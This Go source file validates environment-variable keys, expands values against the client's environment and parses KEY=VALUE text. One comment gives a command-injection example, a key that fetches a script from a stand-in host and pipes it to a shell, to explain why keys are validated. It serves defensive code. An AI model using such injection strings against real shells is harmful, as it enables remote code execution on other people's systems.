package env

import (
	"bufio"
	"os"
	"strings"
)

// IsValidKey reports whether s matches ^[A-Za-z_][A-Za-z0-9_]*$.
// Both the parser and tplenv's shell-output path reject anything else:
// a key like "EVIL;curl evil.example|sh;X" otherwise becomes RCE under
// `eval "$(tplenv … env)"`.
func IsValidKey(s string) bool {
	if s == "" {
		return false
	}
	for i, r := range s {
		if r == '_' {
			continue
		}
		if r >= 'A' && r <= 'Z' {
			continue
		}
		if r >= 'a' && r <= 'z' {
			continue
		}
		if i > 0 && r >= '0' && r <= '9' {
			continue
		}
		return false
	}
	return true
}

// ExpandClientEnv applies os.ExpandEnv to each value in m using the
// caller's (i.e. the client process's) environment. This is the
// counterpart to the daemon's deliberate refusal to do server-side
// env expansion: doing it on the client side means $USERNAME, $HOME,
// $USERPROFILE, etc. resolve to the user's values, not the daemon's.
// Provider-resolved secrets are also passed through ExpandEnv — if a
// secret happens to contain "$something" the client will try to
// expand it. The realistic blast radius is small (it expands against
// the same env the caller already has) but callers that need raw
// secret pass-through should avoid templates that mix the two.
func ExpandClientEnv(m map[string]string) map[string]string {
	out := make(map[string]string, len(m))
	for k, v := range m {
		out[k] = os.ExpandEnv(v)
	}
	return out
}

// ExpandClientEnvBytes is the same idea for raw "KEY=VALUE" lines.
// Lines that are comments, blank, or don't contain '=' are emitted
// verbatim. Only the value portion is expanded.
func ExpandClientEnvBytes(b []byte) []byte {
	scanner := bufio.NewScanner(strings.NewReader(string(b)))
	var out strings.Builder
	first := true
	for scanner.Scan() {
		if !first {
			out.WriteByte('\n')
		}
		first = false
		line := scanner.Text()
		trim := strings.TrimSpace(line)
		if trim == "" || strings.HasPrefix(trim, "#") {
			out.WriteString(line)
			continue
		}
		key, val, ok := strings.Cut(line, "=")
		if !ok {
			out.WriteString(line)
			continue
		}
		out.WriteString(key)
		out.WriteByte('=')
		out.WriteString(os.ExpandEnv(val))
	}
	return []byte(out.String())
}

func ParseEnvBytes(b []byte) map[string]string {
	out := make(map[string]string)
	scanner := bufio.NewScanner(strings.NewReader(string(b)))
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		parts := strings.SplitN(line, "=", 2)
		if len(parts) != 2 {
			continue
		}
		key := strings.TrimSpace(parts[0])
		if !IsValidKey(key) {
			continue
		}
		val := parts[1]
		out[key] = val
	}
	return out
}
